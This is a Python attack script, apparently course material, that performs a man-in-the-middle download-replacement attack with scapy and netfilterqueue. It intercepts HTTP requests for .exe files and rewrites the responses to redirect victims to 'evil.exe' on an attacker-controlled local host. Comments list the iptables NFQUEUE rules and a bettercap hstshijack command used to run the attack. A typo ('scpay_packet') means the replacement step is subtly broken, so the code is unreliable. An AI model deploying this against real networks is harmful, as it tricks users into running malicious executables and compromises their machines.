#!/usr/bin/env python

#command 1: sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
#           sudo iptables -I INPUT -j NFQUEUE --queue-num 0
#           sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#command 2: sudo iptables --flush
#command 3: ping -c 1 bing.com
#commend 4: bettercap -iface enp0s3 -caplet hstshijack/hstshijack


import scapy.all as scapy
import netfilterqueue

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy format
    #print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            print(scapy_packet.show()) 
            if scapy_packet[scapy.TCP].dport == 8080:    
                if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.1.15" not in scapy_packet[scapy.Raw].load:
                    print("[+] exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 8080:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] replacing file")
                    print(scapy_packet.show())
                    #scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.15/evil.exe\n\n"
                    del scapy_packet[scapy.IP].chksum
                    del scpay_packet[scapy.TCP].chksum
                    del scapy_packet[scapy.IP].len
                    packet.set_payload(bytes(scapy_packet))  # convert back to netfilterqueue format and send the packet


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

